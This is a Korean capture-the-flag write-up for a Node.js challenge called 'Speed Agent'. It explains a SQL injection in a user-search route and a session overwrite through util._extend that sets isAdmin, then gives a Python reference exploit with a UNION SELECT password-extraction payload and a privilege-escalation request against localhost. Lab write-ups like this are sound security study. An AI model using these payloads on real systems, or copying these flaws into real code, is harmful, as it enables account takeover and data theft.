# Speed Agent

#### 설명

- 간단한 node.js API 서버
- admin 권한이 되는 것이 목표인 것을 알 수 있다.

```js
// admin_router
admin_router.get('/flag', function(req, res){
	var result = {};
	if(req.session.isAdmin === true) return res.send(FLAG());
	res.send('admin page');
});
```

#### 취약점 1

```js
agent_router.get('/search/:uid', function(req, res){
	var uid = req.params.uid;
	db.get('select * from USER where id='+uid,function(err,row){
		if(err){
			return res.status(500).json({'Error':-1, 'Message':'DB Error'});
		}

		var data = {
			uid: row.id,
			userid: row.userid,
			username: row.username,
			isAdmin: row.isAdmin?true:false,
		};

		return res.json({'Error':0 , 'Message': data });
	});
});
```

유저 검색을 하는 기능 중 유저가 입력한 uid로 인해 SQL Injection이 발생한다. 이를 통해 admin 권한을 가진 유저의 패스워드를 획득 할 수 있으며 해당 admin 계정으로 로그인하게 되면 플래그를 얻을 수 있다.

#### 취약점 2

```js
agent_router.put('/changename', function(req, res){
	const { username } = req.body;

	var name = username.toString();
	db.run('UPDATE USER SET username=? where id=?', name, req.session.uid, function (err) {
		if (err) {
			return res.status(500).json({'Error':-1, 'Message':err.message});
		}
		util._extend(req.session, req.body);
		return res.json({'Error': 0, 'Message':'success'})
	});
});
```

이름을 변경하는 기능에서 `util._extend` 에서 Object Copy 로 인해 현재 유저의 session 데이터를 덮을 수 있게 된다.

```json
{"username":"AnyThing~", "isAdmin":true}
```

위 데이터와 같이 현재 session의 `isAdmin` 값을 `true`로 변경하면 플래그를 얻을 수 있다.

#### 레퍼런스 익스플로잇

```python
import requests, json
import random
import string

def randomString(stringLength=10):
	letters = string.ascii_letters
	return ''.join(random.choice(letters) for i in range(stringLength))

url = "http://localhost:3000/"
headers = {'Content-Type': 'application/json; charset=utf-8'}

def join_login(r):
	userid = randomString()
	userpw = randomString()
	username = randomString()
	data = {'userid':userid, 'userpw':userpw, 'username': username}
	r.put(url + "join", headers=headers, data=json.dumps(data))
	r.post(url+"login", headers=headers, data=json.dumps(data))
	return userid, userpw

def get_flag(r):
	ret = r.get(url+"admin/flag")
	print ret.text

# object copy
def vuln1():
	r = requests.session()
	userid, userpw = join_login(r)
	print userid, userpw

	data = '{"username":"zxc", "isAdmin":true }'
	res = r.put(url + "user/changename", headers=headers, data=data)
	print res.text

	res = r.get(url+"user/me")
	print res.text
	get_flag(r)

# sql injection
def vuln2():
	r = requests.session()
	userid, userpw = join_login(r)
	print userid, userpw
	res = r.get(url + 'user/search/1 union select 1,userpw,3,4,5 from USER where userid="admin"', headers=headers)
	admin_pw = json.loads(res.text)['Message']['userid']
	print admin_pw

	data = {'userid':'admin', 'userpw':admin_pw}
	r.post(url+"login", headers=headers, data=json.dumps(data))
	get_flag(r)


vuln1()
exit()
```
